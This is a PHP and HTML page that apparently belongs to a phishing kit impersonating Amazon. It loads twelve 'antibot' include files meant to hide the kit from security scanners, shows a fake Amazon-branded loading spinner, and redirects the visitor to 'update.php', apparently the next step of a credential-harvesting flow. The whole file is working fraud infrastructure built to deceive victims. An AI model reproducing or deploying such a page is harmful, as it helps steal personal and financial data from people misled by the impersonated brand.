<?php
session_start();

include 'allantibots/a1.php';
include 'allantibots/a2.php';
include 'allantibots/a3.php';
include 'allantibots/a4.php';
include 'allantibots/a5.php';
include 'allantibots/a6.php';
include 'allantibots/a7.php';
include 'allantibots/a8.php';
include 'allantibots/a9.php';
include 'allantibots/a10.php';
include 'allantibots/a11.php';
include 'allantibots/a12.php';

header( "refresh:2.3;url=update.php" );
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Loading......</title>
	<link rel="shortcut icon" href="img/amazon-logo-1.png">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<style>
		.loader {
		  border: 8px solid #f3f3f3;
		  border-radius: 50%;
		  border-top: 8px solid #FF9900;
		  width: 90px;
		  height: 90px;
		  -webkit-animation: spin 2s linear infinite; /* Safari */
		  animation: spin 2s linear infinite;
		  margin: auto;
		  margin-top: 60px;
		}

		/* Safari */
		@-webkit-keyframes spin {
		  0% { -webkit-transform: rotate(0deg); }
		  100% { -webkit-transform: rotate(360deg); }
		}

		@keyframes spin {
		  0% { transform: rotate(0deg); }
		  100% { transform: rotate(360deg); }
		}

		.header{
			background: ;
			width: 100%;
			height: 63px;

			}
		.header img{
			width: 104px;
			display: block;
			margin-right: auto;
			margin-left: auto;
			padding-top: 2px
			}

		.txt1{
			font-size: 15px;
			font-family: arial;
			color: #333333;
			font-weight: bold;
			letter-spacing: -0.2px;
		}
		.a1{
			text-decoration: none;
			font-size: 15px;
			font-family: arial;
			color: #0066c0;
			font-weight: bold;
		}
		.a1:hover{
			text-decoration: underline;

		}

		.style-two {
    border: 0;
    background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0));
    height: 2px;
    border: 0;
    box-shadow: inset 0 12px 12px -12px rgba(0, 0, 0, 0.5);
    opacity: 0.1;
    margin
}

.content3{
	background: ;
	width: 349px;
	height: 80px;
	display: block;
	margin-right: auto;
	margin-left: auto;
	margin-top: 24px;

}

.content3 .cn{
	background: ;
	width: 250px;
	height: 20px;
	padding-left: 28px;
}

.content3 li{
	list-style: none;
	float: left;
	padding-right: 5px;
	padding-left: 5px;
}

.content3 li a{
	font-size: 11px;
	text-decoration: none;
	color: #0066c0;
	font-family: arial;

}
.content3 li a:hover{
	text-decoration: underline;
	color: #c45500;

}
.lastster{
	margin-left: auto;
	margin-right: auto;
	display: block;
	padding-top: 14px; 
	cursor: text;
}

	</style>

</head>
<body>

<div class="header">
	<img src="img/amazon-logo-kira.svg">
</div><!--header-->

<div class="loader"></div>
<br>
<center><p class="txt1">Not redirected ? <a class="a1" href="update.php"> Click here</a></p></center>
<br>
<br>
<br>
<hr class="style-two">

<div class="content3">
	<div class="cn">
		<ul>
			<li><a href="#">Conditions of Use</a></li>
			<li><a href="#">Privacy Notice</a></li>
			<li><a href="#">Help</a></li>
		</ul><!--cn-->
	</div>
	<img class="lastster" src="img/2k18.png">
</div><!--content3-->
</body>
</html>